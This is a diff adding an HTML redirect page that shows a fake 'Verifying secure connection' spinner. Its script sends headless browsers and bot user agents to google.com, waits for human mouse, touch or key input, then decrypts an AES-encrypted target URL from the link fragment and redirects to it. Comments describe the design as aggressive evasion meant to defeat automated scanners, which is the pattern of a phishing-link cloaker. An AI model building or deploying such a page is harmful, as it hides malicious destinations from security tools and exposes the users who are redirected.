@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Securing Connection...</title>
+    <!-- CryptoJS for AES Decryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p id="status">Verifying secure connection...</p>
+    </div>
+
+    <script>
+        // CONFIGURATION
+        // The encrypted payload and secret key should be passed via URL fragment or injected here
+        // Format: #<encrypted_url>|<secret_key> (Simpler for this implementation)
+        // OR injected by the generator script. 
+        // For this template, we will read from the URL hash.
+        
+        const BOT_REDIRECT = "https://www.google.com";
+
+        async function init() {
+            // 1. Anti-Bot: Headless Check
+            if (navigator.webdriver) {
+                console.log("Bot detected (webdriver)");
+                window.location.href = BOT_REDIRECT;
+                return;
+            }
+
+            // 2. Anti-Bot: User Agent (Basic)
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('headless') || ua.includes('crawler') || ua.includes('bot')) {
+                 console.log("Bot detected (UA)");
+                 window.location.href = BOT_REDIRECT;
+                 return;
+            }
+
+            // 3. User Interaction Requirement
+            // We wait for a mousemove or touch event to confirm it's a human
+            // This defeats almost all automated scanners that don't simulate input
+            
+            let humanVerified = false;
+
+            const onInteraction = () => {
+                if (humanVerified) return;
+                humanVerified = true;
+                
+                // Remove listeners
+                document.removeEventListener('mousemove', onInteraction);
+                document.removeEventListener('touchstart', onInteraction);
+                document.removeEventListener('keydown', onInteraction);
+
+                processRedirect();
+            };
+
+            document.addEventListener('mousemove', onInteraction);
+            document.addEventListener('touchstart', onInteraction);
+            document.addEventListener('keydown', onInteraction);
+            
+            // Failsafe: If no interaction in 5 seconds, it might be a bot or a passive user. 
+            // Aggressive evasion: Do nothing.
+            // Less aggressive: Redirect after timeout (riskier).
+            // We will choose: Do nothing, stay on "Verifying..."
+        }
+
+        function processRedirect() {
+            try {
+                // Get ciphertext and key from URL hash
+                // Expected format: index.html#<ciphertext>_<passphrase>
+                const hash = window.location.hash.substring(1);
+                
+                if (!hash || !hash.includes('_')) {
+                    // Invalid format, treat as bot or error
+                    window.location.href = BOT_REDIRECT;
+                    return;
+                }
+
+                const parts = hash.split('_');
+                const ciphertext = parts[0];
+                const passphrase = parts[1];
+
+                // AES Decryption
+                const bytes = CryptoJS.AES.decrypt(ciphertext, passphrase);
+                const originalUrl = bytes.toString(CryptoJS.enc.Utf8);
+
+                if (originalUrl.startsWith('http')) {
+                    document.getElementById('status').innerText = "Redirecting...";
+                    window.location.replace(originalUrl);
+                } else {
+                    throw new Error("Invalid decryption result");
+                }
+            } catch (e) {
+                console.error("Decryption failed", e);
+                window.location.href = BOT_REDIRECT;
+            }
+        }
+
+        // Start
+        init();
+    </script>
+</body>
+</html>
